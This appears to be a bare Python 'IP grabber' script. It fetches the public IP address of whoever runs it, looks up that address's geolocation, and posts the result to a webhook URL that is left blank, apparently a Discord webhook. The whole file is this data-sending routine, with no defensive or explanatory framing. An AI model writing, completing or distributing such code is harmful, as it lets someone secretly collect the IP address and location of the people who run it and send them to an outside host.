import requests
webhook = " "
r = requests.get("http://api.ipify.org/")
re = requests.get("https://extreme-ip-lookup.com/json/",r.text)
requests.post(webhook,json={'content':re.text})
